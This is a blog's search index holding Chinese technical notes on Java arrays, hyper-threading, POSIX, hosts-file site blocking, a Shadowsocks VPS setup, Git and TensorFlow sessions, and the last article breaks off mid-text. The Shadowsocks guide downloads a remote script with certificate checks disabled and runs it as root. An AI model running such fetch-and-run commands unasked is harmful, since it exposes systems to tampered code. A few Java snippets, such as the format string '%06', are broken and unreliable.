<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Java record]]></title>
      <url>/wiki/2018/07/12/Java-record/</url>
      <content type="html"><![CDATA[<p>记录在开发过程中遇到的java常见小问题、细节问题。</p>
<h4 id="获得二维数组长度"><a href="#获得二维数组长度" class="headerlink" title="获得二维数组长度"></a>获得二维数组长度</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[][] board</span><br><span class="line"><span class="keyword">int</span> n = board.length;</span><br><span class="line"><span class="keyword">int</span> m = n &gt; <span class="number">0</span> ? board[<span class="number">0</span>].length : <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h4 id="初始化二维数组"><a href="#初始化二维数组" class="headerlink" title="初始化二维数组"></a>初始化二维数组</h4><p><a href="https://stackoverflow.com/questions/13832880/initialize-2d-array">https://stackoverflow.com/questions/13832880/initialize-2d-array</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">char</span>[][] table = &#123;&#123;<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>&#125;, &#123;<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>&#125;, &#123;<span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="排序二维数组"><a href="#排序二维数组" class="headerlink" title="排序二维数组"></a>排序二维数组</h4><p>按照第1个元素排序：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Arrays.sort(myArr, (a, b) -&gt; Double.compare(a[<span class="number">0</span>], b[<span class="number">0</span>]));</span><br><span class="line">Arrays.sort(queries, Comparator.comparing(a -&gt; a[<span class="number">0</span>]));</span><br><span class="line">Arrays.sort(queries, (a, b) -&gt; a[<span class="number">0</span>] - b[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<h4 id="打印数组"><a href="#打印数组" class="headerlink" title="打印数组"></a>打印数组</h4><p><a href="https://stackoverflow.com/questions/409784/whats-the-simplest-way-to-print-a-java-array">https://stackoverflow.com/questions/409784/whats-the-simplest-way-to-print-a-java-array</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Arrays.toString(array));</span><br><span class="line">Nested Array:</span><br><span class="line">System.out.println(Arrays.deepToString(deepArray));</span><br></pre></td></tr></table></figure>
<h4 id="java中int转成String位数不足前面补零"><a href="#java中int转成String位数不足前面补零" class="headerlink" title="java中int转成String位数不足前面补零"></a>java中int转成String位数不足前面补零</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.format(<span class="string">"%06"</span>,<span class="number">12</span>);<span class="comment">//其中0表示补零而不是补空格，6表示至少6位</span></span><br></pre></td></tr></table></figure>
<h4 id="Java最小值和最大值"><a href="#Java最小值和最大值" class="headerlink" title="Java最小值和最大值"></a>Java最小值和最大值</h4><p><code>Integer.MIN_VALUE</code>和<code>Integer.MAX_VALUE</code></p>
<h4 id="将List转化为数组"><a href="#将List转化为数组" class="headerlink" title="将List转化为数组"></a>将List转化为数组</h4><p>使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">String[] a = list.toArray(<span class="keyword">new</span> String[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>而不是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">...</span><br><span class="line">String[] a = (String[]) list.toArray(list);</span><br></pre></td></tr></table></figure>
<p>但是一下做法是错误的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">int</span>[] a = list.toArray(<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>原因就在与<code>int</code>不能作为范型类型参数(use int as a type argument for generics)。所以只能利用Java8的新特性了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] array = list.stream().mapToInt(i-&gt;i).toArray();</span><br></pre></td></tr></table></figure>
<h4 id="将数组转化为List"><a href="#将数组转化为List" class="headerlink" title="将数组转化为List"></a>将数组转化为List</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Arrays.asList(spam);</span><br></pre></td></tr></table></figure>
<p><a href="https://stackoverflow.com/questions/1073919/how-to-convert-int-into-listinteger-in-java">https://stackoverflow.com/questions/1073919/how-to-convert-int-into-listinteger-in-java</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; list = Arrays.stream(ints).boxed().collect(Collectors.toList());</span><br></pre></td></tr></table></figure>
<h4 id="Java数组拷贝"><a href="#Java数组拷贝" class="headerlink" title="Java数组拷贝"></a>Java数组拷贝</h4><h5 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h5><p>clone方法是从Object类继承过来的，基本数据类型（String ，boolean，char，byte，short，float ，double，long）都可以直接使用clone方法进行克隆，注意String类型是因为其值不可变所以才可以使用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a1 = &#123;<span class="number">1</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] a2 = a1.clone();</span><br></pre></td></tr></table></figure>
<h5 id="System-arraycopy"><a href="#System-arraycopy" class="headerlink" title="System.arraycopy"></a>System.arraycopy</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">arraycopy</span><span class="params">(Object src, <span class="keyword">int</span> srcPos, </span></span></span><br><span class="line"><span class="function"><span class="params">        Object dest, <span class="keyword">int</span> desPos, <span class="keyword">int</span> length)</span></span></span><br></pre></td></tr></table></figure>
<p>由于是native方法，所以效率非常高，在频繁拷贝数组的时候，建议使用。</p>
]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[超线程]]></title>
      <url>/wiki/2018/07/12/OS-%E8%B6%85%E7%BA%BF%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>Intel的超线程技术(Hyper-Threading Technology, HTT)最早出现在2002年2月发布的Xeon处理器上，并于同年底应用在Pentium 4处理器中[1]。超线程技术使一个单一核处理器看起来像多核处理器。对于每一个逻辑核都有架构状态(architecture state，see <a href="https://en.wikipedia.org/wiki/Architectural_state">wiki</a>)的拷贝，并且逻辑核能够共享物理处理资源[2]。</p>
<p>架构状态(architecture state)由寄存器组成，包括general-purpose registers, the control registers, the advanced programmable interrupt controller (APIC) registers, 和一些machine state registers[2~~~~].</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/Processors with Hypter-Threading Technology.png" alt="Processors with Hypter-Threading Technology"></p>
<p>使用超线程技术能够提高处理器性能：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/performace.png" alt="performace"></p>
<ol>
<li><a href="https://en.wikipedia.org/wiki/Hyper-threading">Hyper-threading</a></li>
<li><a href="http://www.cs.sfu.ca/~fedorova/Teaching/CMPT886/Spring2007/papers/hyper-threading.pdf">Hyper-Threading Technology Architecture and Microarchitecture</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[POSIX]]></title>
      <url>/wiki/2018/07/12/OS-POSIX/</url>
      <content type="html"><![CDATA[<p>可移植操作系统接口(POSIX, Portable Operating System Interface)，是基于现有的UNIX 实践和经验，描述了操作系统的调用服务接口，用于保证编制的应用程序可以在源代码一级上在多种操作系统上移植运行[1]。 当前的POSIX主要分为四个部分: Base Definitions、System Interfaces、Shell and Utilities和Rationale.</p>
<p>[1]  Kardinal. <a href="http://i.linuxtoy.org/docs/guide/ch48s05.html">开源世界旅行手册</a></p>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[修饰词native]]></title>
      <url>/wiki/2018/07/12/Java-%E5%85%B3%E9%94%AE%E5%AD%97native/</url>
      <content type="html"><![CDATA[<p>在<code>Class Object</code>中一个<code>wait()</code>方法定义为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br></pre></td></tr></table></figure>
<p>这里的native修饰词说明其修饰的方法的实现，是用其他语言(C/C++)实现的，该方法通过JNI调用本地代码。</p>
<h3 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h3><p><strong>JNI</strong>(Java Native Interface, Java本地接口)使Java虚拟机中的Java程序可以调用本地代码。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15345839777611.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title></title>
      <url>/wiki/2018/03/01/C-%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      <content type="html"></content>
      
        <categories>
            
            <category> C++ </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac禁止访问网站]]></title>
      <url>/wiki/2018/02/02/%E5%B0%8F%E6%8A%80%E5%B7%A7-Mac%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99/</url>
      <content type="html"><![CDATA[<p>最近总是在用电脑的时候，访问一些信息网站，浪费了大量宝贵的时间。在MAC上，禁止访问某些网站，可以直接通过修改host进行。打开终端，在终端输入</p>
<p><code>sudo vim /etc/hosts</code></p>
<p>然后输入密码，然后添加”127.0.0.1”+网址（星号代表子域名）。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 www.zhihu.com</span><br><span class="line">127.0.0.1 *.360.cn</span><br><span class="line">127.0.0.1 指定的网址</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 小技巧 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> website </tag>
            
            <tag> mac </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title></title>
      <url>/wiki/2018/01/06/index/</url>
      <content type="html"><![CDATA[<p>分享、记录CS</p>
<p>内容包括：</p>
<ul>
<li>Leetcode</li>
<li>CSAPP</li>
<li>TensorFlow</li>
<li>常用软件配置安装</li>
</ul>
<p>Name: 王振华<br>BLOG: <a href="http://larryim.cc">http://larryim.cc</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[搭建shadowsocks]]></title>
      <url>/wiki/2018/01/01/awesome-Install-shadowsocks/</url>
      <content type="html"><![CDATA[<h2 id="Shadowsocks简介"><a href="#Shadowsocks简介" class="headerlink" title="Shadowsocks简介"></a>Shadowsocks简介</h2><p><code>Shadowsocks</code>(ss) 是由 <a href="https://github.com/Clowwindy">Clowwindy</a> 开发的一款软件，其作用本来是加密传输资料。当然，也正因为它加密传输资料的特性，使得GFW没法将由它传输的资料和其他普通资料区分开来（上图），也就不能干扰我们访问那些「不存在」的网站了。</p>
<h4 id="VPS简介"><a href="#VPS简介" class="headerlink" title="VPS简介"></a>VPS简介</h4><p>VPS(Virtual private server) 译作虚拟专用伺服器。你可以把它简单地理解为一台在远端的强劲电脑。当你租用了它以后，可以给它安装操作系统、软件，并通过一些工具连接和远程操控它。</p>
<p><a href="https://bandwagonhost.com/">「搬瓦工」</a>是一家 VPS 服务器提供商，有美国、亚洲、欧洲等多地的 VPS。它家的服务器以性价比高、访问速度快闻名。</p>
<h4 id="Linux-和-SSH简介"><a href="#Linux-和-SSH简介" class="headerlink" title="Linux 和 SSH简介"></a>Linux 和 SSH简介</h4><p>Linux是免费开源的操作系统，大概被世界上过半服务器所采用。有大量优秀的开源软件可以安装，上述 <code>Shadowsocks</code> 就是其一。你可以通过命令行来直接给Linux 操作系统「下命令」，比如 <code>$ cd ~/Desktop</code> 就是进入你根目录下的 Desktop 文件夹。</p>
<p>而 SSH 是一种网络协议，作为每一台 Linux 电脑的标准配置，用于计算机之间的加密登录。当你为租用的 VPS 安装 Linux 系统后，只要借助一些工具，就可以用 SSH 在你自己的 Mac/PC 电脑上远程登录该 VPS 了。</p>
<h2 id="部署-Shadowsocks"><a href="#部署-Shadowsocks" class="headerlink" title="部署 Shadowsocks"></a>部署 Shadowsocks</h2><p><code>Shadowsocks</code> 需要同时具备客户端和服务器端，所以它的部署也需要分两步。</p>
<h3 id="部署-Shadowsocks-服务器端"><a href="#部署-Shadowsocks-服务器端" class="headerlink" title="部署 Shadowsocks 服务器端"></a>部署 Shadowsocks 服务器端</h3><p>这里使用<a href="https://teddysun.com/342.html">teddysun</a> 的一键安装脚本。</p>
<p>以下是3条命令，每次输入一行、回车，等待屏幕上的操作完成后再输入下一条。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate [https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh](https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh)</span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure>
<p>最后一步输完，你应该会看到下图中内容──是要你为<code>Shadowsocks</code> 服务设置一个个人密码。</p>
<p>输好回车后会让你选择一个端口，输入1–65535间的数字都行。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/ss.png" alt="ss"></p>
<p>遵照上图指示，按任意键开始部署<code>Shadowsocks</code>。这时你什么都不用做，只需要静静地等它运行完就好。结束后就会看到你所部署的<code>Shadowsocks</code>的配置信息。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/ss_complete.png" alt="ss_complete"></p>
<p>记住其中黄框中的内容，也就是服务器 IP、服务器端口、你设的密码和加密方式。</p>
<h4 id="3-2-TCP-Fast-Open"><a href="#3-2-TCP-Fast-Open" class="headerlink" title="3.2 TCP Fast Open"></a>3.2 TCP Fast Open</h4><p>实际上只要具备上述四个信息，你就可以在自己的任意设备上进行登录使用了。但是为了更好的连接速度，你还需要多做几步。</p>
<p>首先是打开 TCP Fast Open，输入以下命令，意为用 nano 这个编辑器打开一个文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/rc.local</span><br></pre></td></tr></table></figure>
<p>你的「终端」会刷新一下，出现下图。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/nano.png" alt="nano"></p>
<p>别慌张，它就是个文本编辑器。用方向键把光标移到最末端，粘贴下面这一行内容，然后按 <code>Ctrl + X</code>退出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 3 &gt; /proc/sys/net/ipv4/tcp_fastopen</span><br></pre></td></tr></table></figure>
<p>输入“Y”并回车确认退出。</p>
<p>然后依法炮制，输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
<p>在文末加上下面的内容，保存退出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.tcp_fastopen = 3</span><br></pre></td></tr></table></figure>
<p>再打开一个<code>Shadowsocks</code> 配置文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/shadowsocks.json</span><br></pre></td></tr></table></figure>
<p>把其中 “fast_open” 一项的 <code>false</code> 替换成 <code>true</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;fast_open&quot;:true</span><br></pre></td></tr></table></figure>
<p>如果你希望添加多用户的话，可以将 “password” 字段如下图修改。其中，”22345”:”password1”意为该用户使用 22345 端口、以“password1”为密码连接登录<code>Shadowsocks</code>。</p>
<p>保存退出。最后，输入以下命令重启 <code>Shadowsocks</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/shadowsocks restart</span><br></pre></td></tr></table></figure>
<h4 id="3-3安装Shadowsocks客户端"><a href="#3-3安装Shadowsocks客户端" class="headerlink" title="3.3安装Shadowsocks客户端"></a>3.3安装<code>Shadowsocks</code>客户端</h4><p>相比服务器端的安装，客户端的安装就简单了许多。首先，根据操作系统下载相应的客户端。</p>
<ul>
<li><a href="https://sourceforge.net/projects/shadowsocksgui">Mac 版客户端下载</a></li>
<li><a href="https://github.com/shadowsocks/shadowsocks-windows/releases">Win 版客户端下载</a></li>
</ul>
<p>打开客户端，在「服务器设定」(Servers-Open Server Preferences)里新增服务器。然后依次填入服务器 IP、服务器端口、你设的密码和加密方式。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/ss_mac.png" alt="ss_mac"><br><img src="http://or9a8nskt.bkt.clouddn.com/ss_prefenence1.png" alt="ss_prefenence1"></p>
<p>然后启用代理，就可以实现科学上网了。</p>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git]]></title>
      <url>/wiki/2018/01/01/TOOLS-Git/</url>
      <content type="html"><![CDATA[<p>在<code>git pull</code>时出现的问题<code>fatal: refusing to merge unrelated histories</code>。</p>
<p>处理方案，添加<code>--allow-unrelated-histories</code>.</p>
<h2 id="repositories-合并"><a href="#repositories-合并" class="headerlink" title="repositories 合并"></a>repositories 合并</h2><p>You can merge repository A into a subdirectory of a project B using the subtree merge strategy. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git remote add -f Bproject /path/to/B</span><br><span class="line">git merge -s ours --allow-unrelated-histories --no-commit Bproject/master</span><br><span class="line">git <span class="built_in">read</span>-tree --prefix=dir-B/ -u Bproject/master</span><br><span class="line">git commit -m <span class="string">"Merge B project as our subdirectory"</span></span><br><span class="line">git pull -s subtree Bproject master</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TF会话生命周期]]></title>
      <url>/wiki/2017/12/30/TensorFlow-TF%E4%BC%9A%E8%AF%9D%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</url>
      <content type="html"><![CDATA[<p><a href="http://www.uml.org.cn/zjjs/201704123.asp">转自</a></p>
<p>TensorFlow的系统结构以C API为界，将整个系统分为「前端」和「后端」两个子系统：</p>
<p>前端系统：提供编程模型，负责构造计算图；</p>
<p>后端系统：提供运行时环境，负责执行计算图。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148941239904.png" alt="系统架构"></p>
<p>前端系统主要扮演Client的角色，主要负责计算图的构造，并管理Session生命周期过程。</p>
<p>前端系统是一个支持多语言的编程环境，并提供统一的编程模型支撑用户构造计算图。Client通过Session，连接TensorFlow后端的「运行时」，启动计算图的执行过程。</p>
<p>后端系统是TensorFlow的运行时系统，主要负责计算图的执行过程，包括计算图的剪枝，设备分配，子图计算等过程。</p>
<p>本文首先以Session创建为例，揭示前端Python与后端C/C++系统实现的通道，阐述TensorFlow多语言编程的奥秘。随后，以Python前端，C API桥梁，C++后端为生命线，阐述Session的生命周期过程。</p>
<h1 id="Swig-幕后英雄"><a href="#Swig-幕后英雄" class="headerlink" title="Swig: 幕后英雄"></a>Swig: 幕后英雄</h1><p>前端多语言编程环境与后端C/C++实现系统的通道归功于Swig的包装器。TensorFlow使用Bazel的构建工具，在编译之前启动Swig的代码生成过程，通过<code>tf_session.i</code>自动生成了两个适配(Wrapper)文件：</p>
<ul>
<li><p>pywrap_tensorflow.py: 负责对接上层Python调用；</p>
</li>
<li><p>pywrap_tensorflow.cpp: 负责对接下层C实现。</p>
</li>
</ul>
<p>此外，<code>pywrap_tensorflow.py</code>模块首次被加载时，自动地加载<code>_pywrap_tensorflow.so</code>的动态链接库。从而实现了<code>pywrap_tensorflow.py</code>到<code>pywrap_tensorflow.cpp</code>的函数调用关系。</p>
<p>在<code>pywrap_tensorflow.cpp</code>的实现中，静态注册了一个函数符号表。在运行时，按照Python的函数名称，匹配找到对应的C函数实现，最终转调到<code>c_api.c</code>的具体实现。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148941860360.png" alt="Swig代码生成器"></p>
<h1 id="编程接口：Python"><a href="#编程接口：Python" class="headerlink" title="编程接口：Python"></a>编程接口：Python</h1><p>当Client要启动计算图的执行过程时，先创建了一个Session实例，进而调用父类BaseSession的构造函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tensorflow/python/client/session.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span><span class="params">(BaseSession)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target=<span class="string">''</span>, graph=None, config=None)</span>:</span></span><br><span class="line">    super(Session, self).__init__(target, graph, config=config)</span><br><span class="line">    <span class="comment"># ignoring others</span></span><br></pre></td></tr></table></figure>
<p>在BaseSession的构造函数中，将调用<code>pywrap_tensorflow</code>模块中的函数。其中，<code>pywrap_tensorflow</code>模块自动由Swig生成。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># tensorflow/python/client/session.py</span></span><br><span class="line"><span class="keyword">from</span> tensorflow.python <span class="keyword">import</span> pywrap_tensorflow <span class="keyword">as</span> tf_session</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseSession</span><span class="params">(SessionInterface)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target=<span class="string">''</span>, graph=None, config=None)</span>:</span></span><br><span class="line">    self._session = <span class="keyword">None</span></span><br><span class="line">    opts = tf_session.TF_NewSessionOptions(target=self._target, config=config)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> errors.raise_exception_on_not_ok_status() <span class="keyword">as</span> status:</span><br><span class="line">            self._session = tf_session.TF_NewDeprecatedSession(opts, status)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        tf_session.TF_DeleteSessionOptions(opts)</span><br><span class="line"><span class="comment"># ignoring others</span></span><br></pre></td></tr></table></figure>
<h1 id="生成代码：Swig"><a href="#生成代码：Swig" class="headerlink" title="生成代码：Swig"></a>生成代码：Swig</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pywrap_tensorflow.py</span><br></pre></td></tr></table></figure>
<p>在pywrap_tensorflow模块中，通过_pywrap_tensorflow将在_pywrap_tensorflow.so中调用对应的C++函数实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tensorflow/bazel-bin/tensorflow/python/pywrap_tensorflow.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TF_NewDeprecatedSession</span><span class="params">(arg1, status)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> _pywrap_tensorflow.TF_NewDeprecatedSession(arg1, status)</span><br></pre></td></tr></table></figure>
<p>在pywrap_tensorflow.cpp的具体实现中，它静态注册了函数调用的符号表，实现Python的函数名称到C++实现函数的具体映射。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tensorflow/bazel-bin/tensorflow/python/pywrap_tensorflow.cpp</span></span><br><span class="line">static PyMethodDef SwigMethods[] = &#123;</span><br><span class="line">    ...</span><br><span class="line">     &#123;<span class="string">"TF_NewDeprecatedSession"</span>, _wrap_TF_NewDeprecatedSession, METH_VARARGS, NULL&#125;,</span><br><span class="line">&#125;</span><br><span class="line">PyObject *_wrap_TF_NewDeprecatedSession(</span><br><span class="line">PyObject *self, PyObject *args) &#123;</span><br><span class="line">TF_SessionOptions* arg1 = ... </span><br><span class="line">TF_Status* arg2 = ...</span><br><span class="line"></span><br><span class="line">TF_DeprecatedSession* result = TF_NewDeprecatedSession(arg1, arg2);</span><br><span class="line">// ignoring others implements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终，自动生成的pywrap_tensorflow.cpp仅仅负责函数调用的转发，最终将调用底层C系统向上提供的API接口。</p>
<h1 id="C-API：桥梁"><a href="#C-API：桥梁" class="headerlink" title="C API：桥梁"></a>C API：桥梁</h1><p><code>c_api.h</code>是TensorFlow的后端执行系统面向前端开放的公共API接口之一，自此将进入TensorFlow后端系统的浩瀚天空。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tensorflow/c/c_api.c</span></span><br><span class="line"><span class="function">TF_DeprecatedSession* <span class="title">TF_NewDeprecatedSession</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> TF_SessionOptions*, TF_Status* status)</span> </span>&#123;</span><br><span class="line">  Session* session;</span><br><span class="line">  status-&gt;status = NewSession(opt-&gt;options, &amp;session);</span><br><span class="line">  <span class="keyword">if</span> (status-&gt;status.ok()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TF_DeprecatedSession(&#123;session&#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="后端系统：C"><a href="#后端系统：C" class="headerlink" title="后端系统：C++"></a>后端系统：C++</h1><p>NewSession将根据前端传递的Session.target，使用SessionFactory多态创建不同类型的Session(C++)对象。</p>
